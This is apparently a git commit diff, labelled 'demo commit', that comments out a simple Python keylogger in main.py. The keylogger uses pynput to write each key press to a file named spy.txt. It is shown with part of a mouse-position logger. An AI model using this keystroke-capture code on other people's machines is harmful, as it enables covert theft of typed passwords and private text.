bb704d359041919e02f438e63183f3f321778a34
Limitless244 <bharath2440n@gmail.com>
2026-01-31 09:40:50 +0530

    demo commit

--- main.py
+++ main.py
@@ -15,21 +15,21 @@ def writetofile(x,y):
     print('position (x,y) {0}'.format((x,y)) )
 with Listener(on_move=writetofile) as l:
     l.join()'''
-from pynput.keyboard import Listener
-def writetofile(key):
-    keydata=str(key)
-    keydata=keydata.replace("'","")
+# from pynput.keyboard import Listener
+# def writetofile(key):
+#     keydata=str(key)
+#     keydata=keydata.replace("'","")
    
-    if  keydata =='Key.space':
-        keydata=" "
-    if  keydata=='Key.shift_r':
-        keydata=""
-    if  keydata=='Key.shift_l': 
-        keydata=""   
-    if keydata=='Key.enter':
-        keydata=="\n"        
-    with open("spy.txt","a") as f:
-        f.write(keydata)
+#     if  keydata =='Key.space':
+#         keydata=" "
+#     if  keydata=='Key.shift_r':
+#         keydata=""
+#     if  keydata=='Key.shift_l': 
+#         keydata=""   
+#     if keydata=='Key.enter':
+#         keydata=="\n"        
+#     with open("spy.txt","a") as f:
+#         f.write(keydata)
 
-with Listener(on_press=writetofile) as l:
-    l.join()    
+# with Listener(on_press=writetofile) as l:
+#     l.join()    
